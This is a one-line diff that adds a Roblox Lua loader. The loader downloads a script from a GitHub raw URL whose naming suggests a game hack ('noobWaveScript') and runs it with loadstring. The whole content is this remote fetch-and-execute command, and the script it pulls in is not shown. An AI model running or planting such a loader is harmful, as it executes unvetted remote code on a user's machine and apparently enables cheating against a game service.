@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/janesthegodhacker/noobWaveScript/main/script"))()
